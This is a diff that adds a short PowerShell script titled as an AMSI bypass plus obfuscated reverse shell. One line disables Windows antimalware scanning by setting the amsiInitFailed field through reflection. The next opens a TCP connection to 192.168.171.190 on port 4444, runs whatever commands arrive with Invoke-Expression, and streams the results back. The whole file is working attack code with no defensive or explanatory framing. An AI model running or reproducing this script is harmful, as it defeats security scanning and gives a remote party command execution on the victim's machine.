@@ -1,0 +1,3 @@
+# AMSI Bypass + Obfuscated Reverse Shell
+a='System.Management.Automation.AmsiUtils';[Ref].Assembly.GetType(a).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
+$b='System.Net.Sockets.TCPClient';$c='192.168.171.190';$d=4444;$e=New-Object $b($c,$d);$f=$e.GetStream();$g=New-Object Byte[] 65536;while(($i=$f.Read($g,0,$g.Length)) -ne 0){;$h=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($g,0,$i);$j=Invoke-Expression $h 2>&1;$k=$j|Out-String;$l='PS '+(pwd).Path+'> ';$m=($k+$l);$n=[text.encoding]::ASCII.GetBytes($m);$f.Write($n,0,$n.Length);$f.Flush()};$e.Close()
